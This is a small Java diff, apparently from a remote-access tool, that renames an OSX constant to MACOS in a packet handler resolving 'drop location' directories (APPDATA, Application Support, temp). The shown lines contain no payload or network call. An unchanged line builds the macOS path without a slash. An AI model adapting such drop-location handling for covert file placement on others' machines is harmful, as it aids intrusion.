@@ -20,7 +20,7 @@ public class Packet41SpecialDirectory extends AbstractIncomingPacket {
 			case DropLocations.APPDATA:
 				if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 					ret = System.getenv("APPDATA");
-				} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
+				} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
 					ret = System.getProperty("user.home") + "Library/Application Support/";
 				} else {
 					ret = System.getProperty("java.io.tmpdir");
